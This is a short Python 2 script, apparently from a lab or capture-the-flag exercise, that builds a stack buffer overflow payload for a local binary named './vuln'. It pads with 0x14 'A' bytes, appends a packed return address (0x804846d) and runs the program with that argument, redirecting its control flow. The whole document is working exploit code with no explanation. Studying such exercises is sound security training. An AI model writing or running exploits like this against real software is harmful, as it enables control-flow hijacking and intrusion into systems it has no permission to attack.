import struct
from subprocess import call

ret_addr = 0x804846d

def conv(num):
 return struct.pack("<I",num)

buf = "A" * 0x14
buf += conv(ret_addr)

print "Calling vulnerable program"
call(["./vuln", buf])
